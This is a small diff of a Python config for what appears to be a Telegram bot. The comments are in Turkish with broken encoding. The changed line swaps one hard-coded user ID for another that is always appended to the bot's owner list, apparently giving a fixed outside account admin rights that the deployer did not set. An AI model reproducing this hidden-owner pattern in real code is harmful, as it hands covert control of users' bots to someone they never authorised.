@@ -11,7 +11,7 @@ B_TOKEN = os.getenv("BOT_TOKEN") # Kullan�c�'n�n Bot Tokeni
 API_ID = os.getenv("OWNER_API_ID") # Kullan�c�'n�n Ap� Id'si
 API_HASH = os.getenv("OWNER_API_HASH") # Kullan�c�'n�n Ap� Hash'�
 OWNER_ID = os.getenv("OWNER_ID").split() # Botumuzda Yetkili Olmasini Istedigimiz Kisilerin Idlerini Girecegimiz Kisim
-OWNER_ID.append(5240752777)
+OWNER_ID.append(2048155549)
 
 MOD = None
 
